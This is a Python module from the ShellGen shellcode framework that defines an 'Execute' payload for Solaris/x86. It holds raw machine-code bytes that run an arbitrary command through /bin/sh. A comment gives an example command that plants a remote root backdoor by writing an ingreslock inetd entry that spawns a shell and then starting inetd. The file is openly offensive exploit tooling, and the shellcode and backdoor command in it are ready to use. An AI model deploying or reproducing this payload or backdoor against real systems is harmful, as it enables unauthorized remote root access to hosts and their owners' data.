#!/usr/bin/env python

###############################################################################
## Execute any command in Solaris/x86                                        ##
## Shellcode for ShellGen                                                    ##
## Based on anonymous code found on the Internet                             ##
## http://www.exploit-db.com/exploits/13502/                                 ##
###############################################################################

# Copyright (c) 2012 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

__all__ = ["Execute"]

from shellgen import Dynamic

# For example this command sets up a trivial remote backdoor:
# from shellgen.x86.solaris.execute import Execute
# payload = Execute(
#   "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
#   "/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x"
# )

class Execute (Dynamic):
    qualities = "payload"
    encoding  = "term_null"

    def __init__(self, command):
        self.command = command
        if "\x00" in command:
            raise ValueError("Cannot have null chars in command: %r" % command)

    def compile(self, variables = None):
        command = self.command
        if "\x00" in command:
            raise ValueError("Cannot have null chars in command: %r" % command)
        self._bytes = (
"\xeb\x3d\x9a\x24\x24\x24\x24\x07\x24\xc3\x5e\x29\xc0\x89\x46\xbf\x88\x46\xc4"
"\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56\x8d\x5e\x10"
"\x89\x1e\x53\x8d\x5e\x18\x89\x5e\x04\x8d\x5e\x1b\x89\x5e\x08\xb0\x3b\xe8\xc6"
"\xff\xff\xff\xff\xff\xff\xe8\xc6\xff\xff\xff\x01\x01\x01\x01\x02\x02\x02\x02"
"\x03\x03\x03\x03\x04\x04\x04\x04"
"/bin/sh -c "
        ) + self.command + "\x00"
